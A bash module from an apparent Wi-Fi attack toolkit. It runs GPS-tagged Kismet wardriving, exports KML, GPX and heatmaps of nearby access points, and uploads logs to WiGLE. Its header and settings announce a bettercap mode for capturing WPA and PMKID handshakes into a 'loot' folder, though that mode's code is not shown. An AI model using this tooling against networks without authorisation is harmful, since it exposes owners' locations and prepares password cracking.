#!/usr/bin/env bash
# 09_wardrive — GPS-tagged Kismet wardriving, KML + GPX export, WiGLE sync,
# and Pwnagotchi mode (bettercap-driven active WPA/PMKID handshake hunting).
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${CAPTURES_DIR:=$HOME/wifisting/captures}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${WORDLISTS_DIR:=$HOME/wifisting/wordlists}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
: "${WIFISTING_ROOT:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" 2>/dev/null

export WARDRIVE_DIR="$CAPTURES_DIR/wardrive"
export WIGLE_CRED_FILE="$HOME/.wifisting_wigle"
WARDRIVE_PID="$TMP_DIR/wardrive.pid"
GPSD_PID="$TMP_DIR/gpsd.pid"
mkdir -p "$WARDRIVE_DIR"

# ── Pwnagotchi mode: active handshake/PMKID hunting with bettercap ──
# bettercap is driven through a generated caplet and watched through its REST
# API. Everything this mode writes lives under $WARD_PWN_DIR (scratch) so a
# run cannot collide with Kismet's logs or with anything the rest of the tree
# owns; --pwn-export is the only verb that writes into the loot dir, and it
# only ever adds new files under a fresh timestamped subdirectory.
WARD_PWN_DIR="${WARD_PWN_DIR:-$TMP_DIR/wardrive_pwn}"
WARD_PWN_OUT="$WARD_PWN_DIR/out"
WARD_PWN_CAPLET="$WARD_PWN_DIR/pwnagotchi.cap"
WARD_PWN_PID="$WARD_PWN_DIR/bettercap.pid"
WARD_PWN_HOLDER="$WARD_PWN_DIR/stdin-holder.pid"
WARD_PWN_FIFO="$WARD_PWN_DIR/stdin.fifo"
WARD_PWN_LOG="$WARD_PWN_DIR/bettercap.log"
WARD_PWN_ENV="$WARD_PWN_DIR/api.env"
WARD_PWN_LOOT="${WARD_PWN_LOOT:-$LOOT_DIR/wardrive}"
WARD_PWN_PORT="${WARD_PWN_PORT:-8081}"
WARD_PWN_HUNT_PERIOD="${WARD_PWN_HUNT_PERIOD:-60}"

wardrive_check_stack() {
    local missing=()
    for b in kismet gpsd gpspipe; do
        command -v "$b" >/dev/null 2>&1 || missing+=("$b")
    done
    if (( ${#missing[@]} )); then
        warn "missing: ${missing[*]}"
        read -rp "  install now? [y/N] " a
        [[ "$a" =~ ^[Yy]$ ]] || return 1
        apt install -y kismet gpsd gpsd-clients
    fi
    return 0
}

wardrive_detect_gps() {
    info "scanning for GPS devices..."
    local devs=()
    for d in /dev/ttyUSB* /dev/ttyACM* /dev/serial/by-id/*; do
        [[ -e "$d" ]] && devs+=("$d")
    done
    if (( ${#devs[@]} == 0 )); then
        warn "no serial GPS found"
        return 1
    fi
    for i in "${!devs[@]}"; do echo "  [$i] ${devs[$i]}"; done
    read -rp "  select> " sel
    GPS_DEV="${devs[$sel]}"
    export GPS_DEV
    ok "using $GPS_DEV"
}

# ── GPS quality: satellites, HDOP, fix type ──
wardrive_gps_quality_tsv() {
    command -v gpspipe >/dev/null 2>&1 || {
        printf 'available\t0\n'; return 1; }

    local sample
    sample=$(timeout 3 gpspipe -w -n 5 2>/dev/null || true)
    if ! echo "$sample" | grep -q '"class":"TPV"'; then
        printf 'available\t1\nfix_type\tnone\n'
        return 0
    fi

    # Extract lat, lon, alt, hdop, sats from the last TPV + SKY frames
    local lat lon alt hdop mode sats
    lat=$(echo "$sample" | grep -oE '"lat":[^,]+' | tail -1 | cut -d: -f2)
    lon=$(echo "$sample" | grep -oE '"lon":[^,]+' | tail -1 | cut -d: -f2)
    alt=$(echo "$sample" | grep -oE '"alt":[^,}]+' | tail -1 | cut -d: -f2)
    hdop=$(echo "$sample" | grep -oE '"hdop":[^,}]+' | tail -1 | cut -d: -f2)
    mode=$(echo "$sample" | grep -oE '"mode":[0-9]+' | tail -1 | cut -d: -f2)
    sats=$(echo "$sample" | grep -oE '"sat":[0-9]+' | tail -1 | cut -d: -f2)

    printf 'available\t1\n'
    printf 'fix_type\t%s\n' "${mode:-0}"
    printf 'lat\t%s\n'      "${lat:-}"
    printf 'lon\t%s\n'      "${lon:-}"
    printf 'alt\t%s\n'      "${alt:-}"
    printf 'hdop\t%s\n'     "${hdop:-}"
    printf 'sats\t%s\n'     "${sats:-0}"
}

# ── gpsd start (writes its own pidfile) ──
wardrive_start_gpsd() {
    [[ -z "$GPS_DEV" && -f "$TMP_DIR/gps_device" ]] && GPS_DEV=$(cat "$TMP_DIR/gps_device")
    [[ -z "$GPS_DEV" ]] && { wardrive_detect_gps || return 1; }

    info "restarting gpsd on $GPS_DEV"
    systemctl stop gpsd.socket gpsd 2>/dev/null
    pkill -f '^gpsd ' 2>/dev/null
    sleep 1

    nohup gpsd -N -n "$GPS_DEV" -F /var/run/gpsd.sock \
        > "$TMP_DIR/gpsd.log" 2>&1 &
    echo $! > "$GPSD_PID"
    sleep 2
    printf 'STARTED\t%s\n' "$(cat "$GPSD_PID")"
}

wardrive_write_kismet_conf() {
    [[ -z "${MON_IFACE:-}" ]] && { err "no monitor interface"; return 1; }
    local conf="$TMP_DIR/kismet_wardrive.conf"

    # Offline mode: if gpsd is down, tell kismet to skip GPS and warn
    local gps_line="gps=gpsd:host=localhost,port=2947,reconnect=true"
    if ! timeout 1 gpspipe -w -n 1 >/dev/null 2>&1; then
        warn "gpsd not responding — running Kismet without GPS tagging"
        gps_line="# gps=gpsd:host=localhost,port=2947,reconnect=true"
    fi

    cat > "$conf" <<EOF
source=$MON_IFACE:name=wardrive,hop=true,channel_hoprate=5/sec
$gps_line
log_prefix=$WARDRIVE_DIR
log_title=wardrive_$(date +%Y%m%d_%H%M%S)
log_types=kismet,wiglecsv,pcapng
EOF
    export KISMET_CONF="$conf"
    ok "wrote $conf"
}

wardrive_start() {
    wardrive_check_stack || return 1
    wardrive_write_kismet_conf || return 1

    # If gpsd isn't running, try to start it (but don't die on failure)
    if [[ -n "$GPS_DEV" ]]; then
        wardrive_start_gpsd || warn "gpsd failed — continuing without GPS"
    fi

    info "starting kismet (Ctrl+C to stop)"
    kismet -c "$MON_IFACE" --override wardrive \
        --no-ncurses -f "$KISMET_CONF" \
        --log-prefix "$WARDRIVE_DIR" \
        --log-title "wardrive_$(date +%Y%m%d_%H%M%S)" &
    local kpid=$!
    echo "$kpid" > "$WARDRIVE_PID"
    wait "$kpid"
    rm -f "$WARDRIVE_PID"
}

wardrive_export_kml() {
    local latest
    latest=$(ls -t "$WARDRIVE_DIR"/*.kismet 2>/dev/null | head -1)
    [[ -z "$latest" ]] && { err "no kismet log found"; return 1; }
    local kml="${latest%.kismet}.kml"
    info "converting $latest → $kml"
    if command -v kismetdb_to_kml >/dev/null 2>&1; then
        kismetdb_to_kml --in "$latest" --out "$kml"
    else
        local wcsv="${latest%.kismet}.wiglecsv"
        [[ ! -f "$wcsv" ]] && { err "no wiglecsv either"; return 1; }
        wardrive_wiglecsv_to_kml "$wcsv" "$kml"
    fi
    ok "KML written: $kml"
}

# ── GPX export — same input, different output format ──
wardrive_export_gpx() {
    local wcsv="$1"
    [[ -z "$wcsv" ]] && wcsv=$(ls -t "$WARDRIVE_DIR"/*.wiglecsv 2>/dev/null | head -1)
    [[ -z "$wcsv" || ! -f "$wcsv" ]] && { err "no wiglecsv"; return 1; }

    local gpx="${wcsv%.wiglecsv}.gpx"
    info "converting $wcsv → $gpx"

    {
        echo '<?xml version="1.0" encoding="UTF-8"?>'
        echo '<gpx version="1.1" creator="wifisting" xmlns="http://www.topografix.com/GPX/1/1">'
        # wiglecsv: MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type
        # A canonical WiGLE file has TWO header lines (preamble + column
        # header): skipping only one emitted a bogus waypoint named "SSID"
        # at lat="CurrentLatitude" lon="CurrentLongitude".
        tail -n +3 "$wcsv" | while IFS=, read -r mac ssid auth firstseen chan rssi lat lon alt acc type; do
            [[ -z "$lat" || "$lat" == "0" ]] && continue
            local name="${ssid:-<hidden>}"
            # XML-escape the SSID
            name=$(printf '%s' "$name" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
            printf '<wpt lat="%s" lon="%s">\n' "$lat" "$lon"
            printf '  <name>%s</name>\n' "$name"
            printf '  <desc>%s | %s | ch %s | %s dBm</desc>\n' \
                "$mac" "$auth" "$chan" "$rssi"
            [[ -n "$alt" && "$alt" != "0" ]] && printf '  <ele>%s</ele>\n' "$alt"
            printf '</wpt>\n'
        done
        echo '</gpx>'
    } > "$gpx"

    ok "GPX written: $gpx"
}

wardrive_wiglecsv_to_kml() {
    local csv="$1" kml="$2"
    {
        echo '<?xml version="1.0" encoding="UTF-8"?>'
        echo '<kml xmlns="http://www.opengis.net/kml/2.2"><Document>'
        tail -n +3 "$csv" | while IFS=, read -r mac ssid authmode firstseen chan rssi lat lon alt acc type; do
            [[ -z "$lat" || "$lat" == "0" ]] && continue
            printf '<Placemark><name>%s</name><description>%s | %s | %s dBm</description>' \
                "${ssid:-<hidden>}" "$mac" "$authmode" "$rssi"
            printf '<Point><coordinates>%s,%s,%s</coordinates></Point></Placemark>\n' \
                "$lon" "$lat" "${alt:-0}"
        done
        echo '</Document></kml>'
    } > "$kml"
}

wardrive_wigle_upload() {
    [[ ! -f "$WIGLE_CRED_FILE" ]] && {
        warn "no wigle creds. put email:token in $WIGLE_CRED_FILE"
        read -rp "  enter now (email:token, blank=cancel)> " creds
        [[ -z "$creds" ]] && return 1
        echo "$creds" > "$WIGLE_CRED_FILE"
        chmod 600 "$WIGLE_CRED_FILE"
    }
    local auth; auth=$(base64 -w0 < "$WIGLE_CRED_FILE" | tr -d '\n')
    ls -1 "$WARDRIVE_DIR"/*.wiglecsv 2>/dev/null | nl
    read -rp "  file number (or path)> " sel
    if [[ "$sel" =~ ^[0-9]+$ ]]; then
        sel=$(ls -1 "$WARDRIVE_DIR"/*.wiglecsv | sed -n "${sel}p")
    fi
    [[ ! -f "$sel" ]] && { err "not a file"; return 1; }
    info "uploading $sel to Wigle..."
    curl -s -H "Authorization: Basic $auth" \
        -F "file=@$sel" \
        -F "donate=false" \
        "https://api.wigle.net/api/v2/file/upload" | jq . 2>/dev/null || \
        curl -s -H "Authorization: Basic $auth" \
            -F "file=@$sel" -F "donate=false" \
            "https://api.wigle.net/api/v2/file/upload"
}

# ── status / CLI ──

wardrive_cli_status_tsv() {
    local gps_ok=0 gps_dev="" kismet_running=0 pid=""

    for d in /dev/ttyUSB* /dev/ttyACM*; do
        [[ -e "$d" ]] && { gps_dev="$d"; break; }
    done

    if command -v gpspipe >/dev/null 2>&1 && \
       timeout 2 gpspipe -w -n 1 2>/dev/null | grep -q '"class":"TPV"'; then
        gps_ok=1
    fi

    if [[ -f "$WARDRIVE_PID" ]]; then
        pid=$(cat "$WARDRIVE_PID")
        # /proc, not `kill -0`: kismet started via pkexec is root-owned, and
        # `kill -0` reports EPERM for it, i.e. "not running" while it runs.
        [[ "$pid" =~ ^[0-9]+$ && -d "/proc/$pid" ]] && kismet_running=1
    fi

    local latest_kismet=""
    latest_kismet=$(ls -t "$WARDRIVE_DIR"/*.kismet 2>/dev/null | head -1)

    printf 'gps_available\t%s\n' "$gps_ok"
    printf 'gps_device\t%s\n'    "$gps_dev"
    printf 'kismet_running\t%s\n' "$kismet_running"
    printf 'pid\t%s\n'           "$pid"
    printf 'mon_iface\t%s\n'     "${MON_IFACE:-}"
    printf 'wardrive_dir\t%s\n'  "$WARDRIVE_DIR"
    printf 'latest_log\t%s\n'    "$latest_kismet"
    printf 'wigle_creds\t%s\n'   "$([[ -f "$WIGLE_CRED_FILE" ]] && echo yes || echo no)"
}

wardrive_cli_check_stack() {
    local missing=()
    for b in kismet gpsd gpspipe; do
        command -v "$b" >/dev/null 2>&1 || missing+=("$b")
    done
    if (( ${#missing[@]} )); then
        printf 'MISSING\t%s\n' "$(IFS=,; echo "${missing[*]}")"
        return 1
    fi
    printf 'READY\n'
}

wardrive_cli_set_gps() {
    local dev="$1"
    [[ -z "$dev" ]] && { printf 'missing device\n' >&2; return 2; }
    [[ -e "$dev" ]] || { printf 'no such device: %s\n' "$dev" >&2; return 1; }
    printf '%s' "$dev" > "$TMP_DIR/gps_device"
    printf 'GPS\t%s\n' "$dev"
}

wardrive_cli_start_gpsd() {
    local dev="${1:-}"
    [[ -z "$dev" && -f "$TMP_DIR/gps_device" ]] && dev=$(cat "$TMP_DIR/gps_device")
    [[ -z "$dev" ]] && { printf 'no GPS device set\n' >&2; return 1; }
    [[ -e "$dev" ]] || { printf 'no such device: %s\n' "$dev" >&2; return 1; }
    GPS_DEV="$dev"
    wardrive_start_gpsd
}

wardrive_cli_start() {
    [[ -z "${MON_IFACE:-}" ]] && { printf 'no monitor interface\n' >&2; return 1; }
    command -v kismet >/dev/null || { printf 'kismet missing\n' >&2; return 1; }

    wardrive_write_kismet_conf || return 1

    # Detach from the caller so the pidfile holds Kismet itself
    nohup kismet -c "$MON_IFACE" --override wardrive \
        --no-ncurses -f "$KISMET_CONF" \
        --log-prefix "$WARDRIVE_DIR" \
        --log-title "wardrive_$(date +%Y%m%d_%H%M%S)" \
        > "$TMP_DIR/wardrive.log" 2>&1 &
    echo $! > "$WARDRIVE_PID"
    sleep 2
    printf 'STARTED\t%s\n' "$(cat "$WARDRIVE_PID")"
}

wardrive_cli_stop() {
    local killed=0 pid=""
    [[ -f "$WARDRIVE_PID" ]] && pid=$(cat "$WARDRIVE_PID")
    if [[ -n "$pid" ]]; then
        stop_kill_pid "$pid" && killed=1
    fi
    stop_sweep "^kismet" && killed=1

    if (( killed == 1 )); then
        rm -f "$WARDRIVE_PID"
        printf 'STOPPED\n'
        return 0
    fi
    if [[ -n "$pid" ]]; then
        printf 'ERROR\tkismet pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
        return 1
    fi
    printf 'STOPPED\t0\n'
}

wardrive_cli_export_kml() {
    local target="${1:-}"
    [[ -z "$target" ]] && \
        target=$(ls -t "$WARDRIVE_DIR"/*.kismet 2>/dev/null | head -1)
    [[ -z "$target" || ! -f "$target" ]] && { printf 'no kismet log\n' >&2; return 1; }
    local kml="${target%.kismet}.kml"
    if command -v kismetdb_to_kml >/dev/null 2>&1; then
        kismetdb_to_kml --in "$target" --out "$kml"
    else
        local wcsv="${target%.kismet}.wiglecsv"
        [[ ! -f "$wcsv" ]] && { printf 'no converter and no wiglecsv\n' >&2; return 1; }
        wardrive_wiglecsv_to_kml "$wcsv" "$kml"
    fi
    [[ -f "$kml" ]] && printf 'KML\t%s\n' "$kml"
}

wardrive_cli_wigle_upload() {
    local f="$1"
    [[ -z "$f" || ! -f "$f" ]] && { printf 'missing wiglecsv\n' >&2; return 2; }
    [[ -f "$WIGLE_CRED_FILE" ]] || { printf 'no wigle credentials\n' >&2; return 1; }
    local auth
    auth=$(base64 -w0 < "$WIGLE_CRED_FILE" | tr -d '\n')
    curl -s -H "Authorization: Basic $auth" \
        -F "file=@$f" -F "donate=false" \
        "https://api.wigle.net/api/v2/file/upload"
}

# Upload the newest .wiglecsv without needing a file chooser in the GUI.
wardrive_wigle_upload_latest() {
    local f
    f=$(ls -t "$WARDRIVE_DIR"/*.wiglecsv 2>/dev/null | head -1)
    [[ -z "$f" || ! -f "$f" ]] && {
        printf 'ERROR\tno .wiglecsv found in the wardrive folder\n' >&2
        printf 'HINT\trun --export-kml or a WiGLE-format export first.\n' >&2
        return 1
    }
    [[ -f "$WIGLE_CRED_FILE" ]] || {
        printf 'ERROR\tno WiGLE credentials at %s\n' "$WIGLE_CRED_FILE" >&2
        printf 'HINT\twrite "user:api_token" to that file (chmod 600).\n' >&2
        return 1
    }
    wardrive_cli_wigle_upload "$f"
}

wardrive_cli_list_logs_tsv() {
    local f
    for f in "$WARDRIVE_DIR"/*.kismet; do
        [[ -e "$f" ]] || continue
        local size mtime
        size=$(stat -c%s "$f")
        mtime=$(stat -c%Y "$f")
        printf '%s\t%s\t%s\n' "$(basename "$f")" "$size" "$mtime"
    done
}

# ── verified stop ──
# Escalating signals; returns 0 ONLY once the pid is actually gone. Signals
# the process group first so forked children die with the leader. Stops that
# print STOPPED and delete the pidfile without this can strand a capture with
# no remaining handle to it, making the stop button useless.
stop_kill_pid() {
    local pid="$1" i
    # Liveness via /proc, NOT `kill -0`: for a root-owned process we get EPERM,
    # and treating that as "gone" made stops report success while nothing died.
    [[ -d "/proc/$pid" ]] || return 0
    kill -INT  "-$pid" 2>/dev/null || kill -INT  "$pid" 2>/dev/null
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
    for i in 1 2 3 4 5; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -KILL "-$pid" 2>/dev/null || kill -KILL "$pid" 2>/dev/null
    sleep 0.3
    [[ -d "/proc/$pid" ]] && return 1
    return 0
}
# Kill everything matching a pgrep -f pattern, never this shell or its parent.
# Returns non-zero only if something matched and SURVIVED.
stop_sweep() {
    local pat="$1" sp rs=0 any=0
    # Exclude this process AND its whole ancestor chain. Excluding only $$ and
    # $PPID is not enough: when invoked via `timeout` or pkexec the caller's
    # shell is further up, and a cmdline substring match would kill it — a
    # pattern like "mitm6" matches the very command line running this stop.
    local -A _skip=()
    sp=$$
    while [[ -n "$sp" && "$sp" != "0" && "$sp" != "1" ]]; do
        _skip[$sp]=1
        sp=$(ps -o ppid= -p "$sp" 2>/dev/null | tr -d ' ')
        [[ -z "$sp" ]] && break
    done
    for sp in $(pgrep -f "$pat" 2>/dev/null); do
        [[ -n "${_skip[$sp]:-}" ]] && continue
        any=1
        stop_kill_pid "$sp" || rs=1
    done
    (( any )) && return $rs
    return 0
}

# ── Heatmap (merged from 44_wifi_geolocate, submenu: Heatmap) ──
# Renders a Kismet or WiGLE CSV into a self-contained SVG. Deliberately no
# matplotlib: a pure-SVG generator has no Python dependency, is
# deterministic, and opens in any browser.

# Render the parsed points with matplotlib when available (real density
# surface), else fall back to the dependency-free SVG generator in
# wardrive_heatmap_svg. $1 = points file, $2 = output, $3 = title.
wardrive_heatmap_png() {
    local pts="$1" out="$2" title="$3" py="$WARDRIVE_DIR/.heatmap_render.py"
    command -v python3 >/dev/null 2>&1 || return 1
    python3 -c 'import matplotlib, numpy, scipy' 2>/dev/null || return 1

    mkdir -p "$WARDRIVE_DIR"
    cat > "$py" <<'PYSRC'
import sys, numpy as np
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt
from matplotlib.colors import LinearSegmentedColormap
from matplotlib.patches import Patch
from scipy.ndimage import gaussian_filter

src, out, title = sys.argv[1], sys.argv[2], sys.argv[3]

lat, lon, rssi, names = [], [], [], []
with open(src) as f:
    for line in f:
        p = line.rstrip("\n").split(" ", 3)
        if len(p) < 4:
            continue
        try:
            la, lo, rs = float(p[0]), float(p[1]), float(p[2])
        except ValueError:
            continue
        lat.append(la); lon.append(lo); rssi.append(rs); names.append(p[3])

if not lat:
    print("ERROR no points")
    sys.exit(1)

lat = np.array(lat); lon = np.array(lon); rssi = np.array(rssi)

# dark, matches the app's palette
cmap = LinearSegmentedColormap.from_list("wifisting", [
    "#0b0d12", "#2a0a14", "#7a0f2b", "#c8103a", "#ff3152",
    "#ff8a3d", "#ffd60a", "#9ed34a", "#2fbf5f"])

fig, ax = plt.subplots(figsize=(11.5, 7.6), dpi=110)
fig.patch.set_facecolor("#0b0d12")
ax.set_facecolor("#0b0d12")

# --- density surface -------------------------------------------------
pad_lat = max((lat.max() - lat.min()) * 0.12, 0.0004)
pad_lon = max((lon.max() - lon.min()) * 0.12, 0.0004)
extent = [lon.min() - pad_lon, lon.max() + pad_lon,
          lat.min() - pad_lat, lat.max() + pad_lat]
dlon = extent[1] - extent[0]
dlat = extent[3] - extent[2]

bins = 140
H, xe, ye = np.histogram2d(lon, lat, bins=bins, range=[[extent[0], extent[1]],
                                                      [extent[2], extent[3]]])
Hs = gaussian_filter(H, sigma=2.2)
if Hs.max() > 0:
    Hs = Hs / Hs.max()

im = ax.imshow(Hs.T, origin="lower", extent=extent, cmap=cmap,
               aspect="auto", interpolation="bilinear", alpha=0.9,
               vmin=0, vmax=1)
cb = fig.colorbar(im, ax=ax, fraction=0.035, pad=0.02)
cb.set_label("observation density", color="#8a8f99", fontsize=9)
cb.ax.tick_params(colors="#8a8f99", labelsize=8)
cb.outline.set_edgecolor("#343740")

# --- AP markers, coloured by RSSI ------------------------------------
def colour(s):
    if s >= -50: return "#2fbf5f"
    if s >= -65: return "#9ed34a"
    if s >= -75: return "#ffd60a"
    if s >= -85: return "#ff8a3d"
    return "#ff3152"

ax.scatter(lon, lat, c=[colour(s) for s in rssi], s=52,
           edgecolors="#0b0d12", linewidths=1.1, zorder=3)

# One label per SSID, placed at that SSID's STRONGEST observation, with
# greedy collision rejection. Labelling every point produced an unreadable
# pile wherever observations cluster.
best = {}
for i, n in enumerate(names):
    if n not in best or rssi[i] > rssi[best[n]]:
        best[n] = i

placed = []
for n, i in sorted(best.items(), key=lambda kv: -rssi[kv[1]]):
    if len(placed) >= 18:
        break
    # crude but effective: reject labels that land near one already placed
    if any((abs(lon[i] - px) < dlon * 0.06 and abs(lat[i] - py) < dlat * 0.045)
           for px, py in placed):
        continue
    placed.append((lon[i], lat[i]))
    ax.annotate(n[:24], (lon[i], lat[i]), textcoords="offset points",
                xytext=(7, 4), fontsize=8, color="#e8e8eb", zorder=4,
                bbox=dict(boxstyle="round,pad=0.15", fc="#0b0d12",
                          ec="none", alpha=0.65))

leg = [Patch(facecolor=colour(v), label=lbl) for v, lbl in
       [(-45, ">= -50 dBm  strong"), (-60, "-50..-65"), (-70, "-65..-75"),
        (-80, "-75..-85"), (-95, "< -85 dBm  weak")]]
ax.legend(handles=leg, loc="lower left", fontsize=8, framealpha=0.25,
          facecolor="#12141a", edgecolor="#343740", labelcolor="#c9ccd3")

ax.set_title(f"{title}  -  {len(lat)} access points with a GPS fix",
             color="#e8e8eb", fontsize=12, family="monospace", loc="left")
ax.set_xlabel("longitude", color="#8a8f99", fontsize=9)
ax.set_ylabel("latitude", color="#8a8f99", fontsize=9)
ax.tick_params(colors="#8a8f99", labelsize=8)
for sp in ax.spines.values():
    sp.set_edgecolor("#343740")
ax.grid(True, color="#1b1e26", linewidth=0.6)

fig.tight_layout()
fig.savefig(out, facecolor=fig.get_facecolor())
print("OK")
PYSRC
    python3 "$py" "$pts" "$out" "$title" 2>/dev/null || return 1
    [[ -s "$out" ]] || return 1
    return 0
}

# Parse a log into "lat lon rssi ssid" lines. Shared by both renderers so
# the two paths can never disagree about what the data means.
# $1 = log, $2 = points outfile. Echoes the point count.
wardrive_heatmap_points() {
    local log="$1" pts="$2" fmt=""

    case "$log" in
        *.wiglecsv) fmt=wigle ;;
        *.kismet|*.csv) fmt=kismet ;;
        *) printf 'ERROR\tunrecognised log type: %s\n' "$(basename "$log")" >&2; return 1 ;;
    esac

    if [[ "$fmt" == "wigle" ]]; then
        # MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,Lat,Lon,Alt,Acc,Type
        awk -F',' 'NR>1 && $7+0 != 0 && $8+0 != 0 {
            gsub(/^"|"$/, "", $2)
            n = ($2 == "" ? "(hidden)" : $2); gsub(/ /, "_", n)
            printf "%.6f %.6f %s %s\n", $7, $8, ($6=="" ? -100 : $6), n
        }' "$log" > "$pts" 2>/dev/null
    else
        # Kismet CSV: map by header name rather than fixed columns.
        awk -F',' '
            NR==1 || tolower($0) ~ /bssid/ {
                for (i=1;i<=NF;i++) {
                    h=tolower($i); gsub(/^"|"$/,"",h)
                    if (h ~ /^lat/) lat=i
                    else if (h ~ /^lon/) lon=i
                    else if (h ~ /signal|rssi/) sig=i
                    else if (h ~ /^ssid/) ssid=i
                }
                next
            }
            lat && lon && $lat+0 != 0 && $lon+0 != 0 {
                n = (ssid ? $ssid : "(hidden)"); gsub(/^"|"$/,"",n)
                if (n == "") n = "(hidden)"
                gsub(/ /, "_", n)
                printf "%.6f %.6f %s %s\n", $lat, $lon, (sig ? $sig+0 : -100), n
            }' "$log" > "$pts" 2>/dev/null
    fi

    local np
    np=$(grep -c . "$pts" 2>/dev/null) || np=0
    printf '%s\n' "$np"
}

# Dependency-free fallback: discrete points as SVG.
wardrive_heatmap_svg() {
    local pts="$1" out="$2" title="$3"
    local W=1000 H=700 n
    n=$(grep -c . "$pts" 2>/dev/null) || n=0

    local bounds
    bounds=$(awk '
        { if (NR==1 || $1<minlat) minlat=$1; if (NR==1 || $1>maxlat) maxlat=$1
          if (NR==1 || $2<minlon) minlon=$2; if (NR==1 || $2>maxlon) maxlon=$2 }
        END {
          dlat = maxlat-minlat; if (dlat <= 0) dlat = 0.001
          dlon = maxlon-minlon; if (dlon <= 0) dlon = 0.001
          printf "%.6f %.6f %.6f %.6f", minlat-dlat*0.05, maxlat+dlat*0.05,
                                        minlon-dlon*0.05, maxlon+dlon*0.05
        }' "$pts")
    local minlat maxlat minlon maxlon
    read -r minlat maxlat minlon maxlon <<<"$bounds"

    {
        printf '<svg xmlns="http://www.w3.org/2000/svg" width="%s" height="%s" viewBox="0 0 %s %s">\n' "$W" "$H" "$W" "$H"
        printf '<rect width="100%%" height="100%%" fill="#0b0d12"/>\n'
        printf '<text x="16" y="26" fill="#e8e8eb" font-family="monospace" font-size="15">%s</text>\n' "$title"
        printf '<text x="16" y="46" fill="#8a8f99" font-family="monospace" font-size="11">%s access points (matplotlib not available - discrete points)</text>\n' "$n"
        printf '%s\n' "$(cat "$pts")" | awk -v W="$W" -v H="$H" \
            -v nlat="$minlat" -v xlat="$maxlat" -v nlon="$minlon" -v xlon="$maxlon" '
            {
                x = ($2-nlon)/(xlon-nlon) * (W-80) + 40
                y = H - (($1-nlat)/(xlat-nlat) * (H-140) + 60)
                s = $3+0
                c = (s>=-50 ? "#2fbf5f" : s>=-65 ? "#9ed34a" : s>=-75 ? "#ffd60a" : s>=-85 ? "#ff8a3d" : "#ff3152")
                printf "<circle cx=\"%.1f\" cy=\"%.1f\" r=\"14\" fill=\"%s\" fill-opacity=\"0.30\"/>\n", x, y, c
                printf "<circle cx=\"%.1f\" cy=\"%.1f\" r=\"4\" fill=\"%s\"/>\n", x, y, c
                if (n++ < 25)
                    printf "<text x=\"%.1f\" y=\"%.1f\" fill=\"#c9ccd3\" font-family=\"monospace\" font-size=\"9\">%s</text>\n", x+9, y+3, substr($4,1,22)
            }'
        printf '</svg>\n'
    } > "$out" 2>/dev/null || return 1
    [[ -s "$out" ]] || return 1
    return 0
}

# Dispatcher: matplotlib for a real density surface, SVG when it is absent.
wardrive_heatmap() {
    local log="$1" out="${2:-}" pts n base

    if [[ -z "$log" ]]; then
        log=$(ls -t "$WARDRIVE_DIR"/*.wiglecsv "$WARDRIVE_DIR"/*.kismet 2>/dev/null | head -1)
    fi
    [[ -z "$log" || ! -f "$log" ]] && { printf 'ERROR\tno log file\n' >&2; return 1; }

    base=$(basename "$log")
    pts="$WARDRIVE_DIR/.heatmap_$$.pts"
    n=$(wardrive_heatmap_points "$log" "$pts") || { rm -f "$pts"; return 1; }

    if [[ "${n:-0}" -eq 0 ]]; then
        rm -f "$pts"
        printf 'ERROR\tno GPS-tagged rows in %s\n' "$base" >&2
        printf 'HINT\ta log without a GPS fix cannot be mapped - check the GPS tab.\n' >&2
        return 1
    fi

    if command -v python3 >/dev/null 2>&1 && \
       python3 -c 'import matplotlib, numpy, scipy' 2>/dev/null; then
        [[ -z "$out" ]] && out="${log%.*}.heatmap.png"
        if wardrive_heatmap_png "$pts" "$out" "$base"; then
            rm -f "$pts"
            printf 'PNG\t%s\nPOINTS\t%s\nSOURCE\t%s\nRENDERER\tmatplotlib\n' "$out" "$n" "$base"
            return 0
        fi
    fi

    [[ -z "$out" ]] && out="${log%.*}.heatmap.svg"
    if wardrive_heatmap_svg "$pts" "$out" "$base"; then
        rm -f "$pts"
        printf 'SVG\t%s\nPOINTS\t%s\nSOURCE\t%s\nRENDERER\tsvg\n' "$out" "$n" "$base"
        return 0
    fi
    rm -f "$pts"
    printf 'ERROR\tcould not render heatmap\n' >&2
    return 1
}

# ══════════════════════════════════════════════════════════════════════════
